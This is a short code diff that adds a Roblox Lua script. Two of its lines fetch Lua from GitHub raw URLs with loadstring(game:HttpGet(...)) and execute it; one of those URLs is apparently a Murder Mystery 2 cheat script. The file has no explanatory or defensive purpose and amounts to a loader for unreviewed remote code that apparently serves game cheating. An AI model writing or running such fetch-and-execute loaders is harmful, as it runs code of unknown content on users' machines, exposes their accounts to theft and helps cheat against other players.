@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Lakany/MOLYN-DEVELOPMENT/refs/heads/main/README.md"))()
+task.wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/haiiipplheh/woowmm2scriptwoohooo/refs/heads/main/wow.lua"))()
+print("lord")
